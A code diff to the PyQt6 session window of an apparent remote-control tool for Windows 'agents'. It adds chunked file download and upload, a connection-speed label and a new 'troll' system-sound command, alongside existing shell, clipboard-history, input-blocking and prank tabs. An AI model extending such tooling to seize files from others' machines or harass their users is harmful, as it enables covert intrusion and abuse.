@@ -3,7 +3,6 @@ import os
 import json
 import time
 import struct
-import asyncio
 from PyQt6.QtWidgets import (
     QMainWindow,
     QToolBar,
@@ -17,10 +16,15 @@ from PyQt6.QtWidgets import (
     QFrame,
     QToolButton,
     QTabWidget,
+    QFileDialog,
+    QProgressDialog,
+    QApplication,
+    QSizePolicy, 
 )
-from PyQt6.QtGui import QAction, QPixmap
+from PyQt6.QtGui import QAction
 from PyQt6.QtCore import Qt, QTimer
 import base64
+import ntpath  # For extracting remote Windows filenames
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
@@ -39,7 +43,6 @@ from viewer.clipboard_tab import ClipboardTab
 from viewer.settings_tab import SettingsTab
 from viewer.troll_tab import TrollTab
 from core import protocol
-from core.network import send_msg
 
 SETTINGS_FILE = "capture_settings.json"
 
@@ -56,6 +59,13 @@ class SessionWindow(QMainWindow):
         self.closing = False
         self.mouse_enabled = False  # Default to Mouse OFF
         self.input_blocked = False
+
+        # File download state
+        self._download_file = None   # Open file handle for active download
+        self._download_path = None   # Full local path being written to
+        self._download_total = 0     # Expected file size (from OP_FM_DOWNLOAD_INFO)
+        self._download_received = 0  # Bytes received so far
+        self._download_progress = None  # QProgressDialog for large downloads
 
         # Mouse Throttling (send every 100ms max = 10 moves/sec)
         self._last_mouse_time = 0
@@ -166,6 +176,9 @@ class SessionWindow(QMainWindow):
         self.troll_tab.alert_loop_signal.connect(
             lambda e: self.send_troll(protocol.OP_TROLL_ALERT_LOOP, {"enabled": e})
         )
+        self.troll_tab.system_sound_signal.connect(
+            lambda s: self.send_troll(protocol.OP_TROLL_SYSTEM_SOUND, {"sound": s})
+        )
         self.troll_tab.volume_max_signal.connect(
             lambda: self.send_troll(protocol.OP_TROLL_VOLUME_MAX, {})
         )
@@ -236,13 +249,23 @@ class SessionWindow(QMainWindow):
         self.worker.shell_cwd.connect(self.shell_tab.update_cwd)
         self.worker.pm_data.connect(self.pm_tab.update_data)
         self.worker.fm_data.connect(self.fm_tab.update_data)
+        self.worker.fm_chunk.connect(self._on_fm_chunk)
+        self.worker.fm_download_info.connect(self._on_fm_download_info)
         self.worker.clipboard_data.connect(self.clipboard_tab.update_content)
         self.worker.clipboard_history.connect(self.clipboard_tab.update_history)
         self.worker.clipboard_entry.connect(self.clipboard_tab.add_entry)
         self.worker.sysinfo_data.connect(self.device_settings_tab.update_sysinfo)
 
+        # Connection status
+        self.worker.connection_lost.connect(self._on_connection_lost)
+
         # Connect the new connection failed signal
         self.worker.connection_failed_dialog_request.connect(self._on_connection_failed_dialog_request)
+
+        # Bandwidth speed timer (1 second interval)
+        self._speed_timer = QTimer(self)
+        self._speed_timer.timeout.connect(self._update_speed)
+        self._speed_timer.start(1000)
 
 
         # Clipboard tab outgoing signals
@@ -351,6 +374,70 @@ class SessionWindow(QMainWindow):
         btn_disconnect.setStyleSheet("color: #FF5555; font-weight: bold;")
         btn_disconnect.clicked.connect(self.disconnect_session)
         self.toolbar.addWidget(btn_disconnect)
+
+        # --- Right-aligned connection status ---
+        spacer = QWidget()
+        spacer.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Preferred)
+        self.toolbar.addWidget(spacer)
+
+        self.connection_label = QLabel("⏳ Connecting...")
+        self.connection_label.setStyleSheet(
+            "color: #FFA500; font-weight: bold; padding: 5px 10px;"
+        )
+        self.toolbar.addWidget(self.connection_label)
+
+    def _update_speed(self):
+        """Called every 1 second to update connection speed display."""
+        if not hasattr(self, 'worker') or not self.worker:
+            return
+
+        # Read and reset all counters
+        bytes_in = self.worker._bytes_received
+        bytes_out = self.worker._bytes_sent
+        fps = self.worker._webrtc_frames
+        self.worker._bytes_received = 0
+        self.worker._bytes_sent = 0
+        self.worker._webrtc_frames = 0
+
+        total = bytes_in + bytes_out + fps
+
+        if total == 0:
+            if self.worker.running:
+                self.connection_label.setText("✅ (Idle)")
+                self.connection_label.setStyleSheet(
+                    "color: #50FA7B; font-weight: bold; padding: 5px 10px;"
+                )
+            return
+
+        # Format speed
+        def fmt(b):
+            if b >= 1024 * 1024:
+                return f"{b / (1024 * 1024):.1f} MB/s"
+            elif b >= 1024:
+                return f"{b / 1024:.0f} KB/s"
+            return f"{b} B/s"
+
+        parts = []
+        if fps > 0:
+            parts.append(f"{fps}fps")
+        if bytes_in > 0:
+            parts.append(f"↓{fmt(bytes_in)}")
+        if bytes_out > 0:
+            parts.append(f"↑{fmt(bytes_out)}")
+
+        self.connection_label.setText(f"✅ {' • '.join(parts)}")
+        self.connection_label.setStyleSheet(
+            "color: #50FA7B; font-weight: bold; padding: 5px 10px;"
+        )
+
+    def _on_connection_lost(self):
+        """Handle connection lost event."""
+        if hasattr(self, '_speed_timer'):
+            self._speed_timer.stop()
+        self.connection_label.setText("❌ Connection Lost")
+        self.connection_label.setStyleSheet(
+            "color: #FF5555; font-weight: bold; padding: 5px 10px;"
+        )
 
     def setup_bottom_panel(self, parent_layout):
         panel = QFrame()
@@ -648,11 +735,8 @@ class SessionWindow(QMainWindow):
 
     def send_command(self, opcode, payload=b""):
         try:
-            if self.worker.loop and self.worker.ws:
-                asyncio.run_coroutine_threadsafe(
-                    send_msg(self.worker.ws, bytes([opcode]) + payload),
-                    self.worker.loop,
-                )
+            data = bytes([opcode]) + payload
+            self.worker.send_msg(data)
         except Exception as e:
             print(f"[-] Send command error: {e}")
 
@@ -688,16 +772,171 @@ class SessionWindow(QMainWindow):
         self.send_command(protocol.OP_FM_LIST, payload)
 
     def request_file_download(self, path):
-        """Request file download from agent."""
+        """Request file download from agent with folder selection."""
+        # Extract remote filename using ntpath (agent is Windows)
+        filename = ntpath.basename(path)
+        if not filename:
+            QMessageBox.warning(self, "Download", "Cannot determine filename.")
+            return
+
+        # Ask where to save (folder picker, like upload uses file picker)
+        save_dir = QFileDialog.getExistingDirectory(
+            self, "Select Download Folder", os.path.expanduser("~")
+        )
+        if not save_dir:
+            return  # User cancelled
+
+        local_path = os.path.join(save_dir, filename)
+
+        # Handle existing file
+        if os.path.exists(local_path):
+            reply = QMessageBox.question(
+                self,
+                "File Exists",
+                f"{filename} already exists in this folder.\nOverwrite?",
+                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
+            )
+            if reply != QMessageBox.StandardButton.Yes:
+                return
+
+        # Open file for writing
+        try:
+            self._download_file = open(local_path, "wb")
+            self._download_path = local_path
+        except Exception as e:
+            QMessageBox.critical(self, "Download Error", f"Cannot create file:\n{e}")
+            return
+
+        # Send download request to agent
         payload = json.dumps({"path": path}).encode("utf-8")
         self.send_command(protocol.OP_FM_DOWNLOAD, payload)
 
+    def _on_fm_download_info(self, info: dict):
+        """Handle download file info from agent (arrives before chunks)."""
+        self._download_total = info.get("size", 0)
+        self._download_received = 0
+        filename = info.get("name", "file")
+
+        # Show progress dialog for large files (>5MB)
+        CHUNK_THRESHOLD = 5 * 1024 * 1024
+        if self._download_total > CHUNK_THRESHOLD:
+            self._download_progress = QProgressDialog(
+                f"Downloading {filename}...", "Cancel", 0, self._download_total, self
+            )
+            self._download_progress.setWindowTitle("Download Progress")
+            self._download_progress.setWindowModality(Qt.WindowModality.WindowModal)
+            self._download_progress.setMinimumDuration(0)
+            self._download_progress.show()
+
+    def _on_fm_chunk(self, data: bytes):
+        """Handle incoming file download chunks from agent."""
+        if not self._download_file:
+            return
+
+        if not data:
+            # Empty chunk = end of stream
+            try:
+                self._download_file.close()
+            except Exception:
+                pass
+            path = self._download_path
+            self._download_file = None
+            self._download_path = None
+            self._download_total = 0
+            self._download_received = 0
+            if self._download_progress:
+                self._download_progress.close()
+                self._download_progress = None
+            QMessageBox.information(
+                self, "Download Complete", f"File saved to:\n{path}"
+            )
+            return
+
+        # Check for user cancellation
+        if self._download_progress and self._download_progress.wasCanceled():
+            try:
+                self._download_file.close()
+            except Exception:
+                pass
+            # Clean up partial file
+            try:
+                os.remove(self._download_path)
+            except Exception:
+                pass
+            self._download_file = None
+            self._download_path = None
+            self._download_total = 0
+            self._download_received = 0
+            self._download_progress = None
+            return
+
+        try:
+            self._download_file.write(data)
+            self._download_received += len(data)
+            if self._download_progress:
+                self._download_progress.setValue(self._download_received)
+        except Exception as e:
+            print(f"[-] FM Chunk Write Error: {e}")
+            try:
+                self._download_file.close()
+            except Exception:
+                pass
+            self._download_file = None
+            self._download_path = None
+            if self._download_progress:
+                self._download_progress.close()
+                self._download_progress = None
+
     def upload_file(self, remote_path, data):
-        """Upload file to agent."""
-        payload = json.dumps(
-            {"path": remote_path, "data": base64.b64encode(data).decode("ascii")}
-        ).encode("utf-8")
-        self.send_command(protocol.OP_FM_UPLOAD, payload)
+        """Upload file to agent. Uses chunked transfer with progress for large files."""
+        CHUNK_THRESHOLD = 5 * 1024 * 1024  # 5MB
+        UPLOAD_CHUNK_SIZE = 256 * 1024     # 256KB
+
+        total = len(data)
+
+        if total <= CHUNK_THRESHOLD:
+            # Small file: instant base64 upload (original behavior)
+            payload = json.dumps(
+                {"path": remote_path, "data": base64.b64encode(data).decode("ascii")}
+            ).encode("utf-8")
+            self.send_command(protocol.OP_FM_UPLOAD, payload)
+        else:
+            # Large file: chunked upload with progress dialog
+            filename = os.path.basename(remote_path) or remote_path
+
+            # Send chunked header (no "data" field = chunked mode)
+            header = json.dumps({"path": remote_path, "size": total}).encode("utf-8")
+            self.send_command(protocol.OP_FM_UPLOAD, header)
+
+            # Show progress dialog
+            progress = QProgressDialog(
+                f"Uploading {filename}...", "Cancel", 0, total, self
+            )
+            progress.setWindowTitle("Upload Progress")
+            progress.setWindowModality(Qt.WindowModality.WindowModal)
+            progress.setMinimumDuration(0)
+            progress.show()
+
+            # Send chunks
+            offset = 0
+            cancelled = False
+            while offset < total:
+                if progress.wasCanceled():
+                    cancelled = True
+                    break
+
+                chunk = data[offset:offset + UPLOAD_CHUNK_SIZE]
+                self.send_command(protocol.OP_FM_CHUNK, chunk)
+                offset += len(chunk)
+                progress.setValue(offset)
+                QApplication.processEvents()  # Keep UI responsive
+
+            if not cancelled:
+                # Send EOF marker
+                self.send_command(protocol.OP_FM_CHUNK, b"")
+                progress.setValue(total)
+
+            progress.close()
 
     def delete_file(self, path):
         """Delete file on agent."""
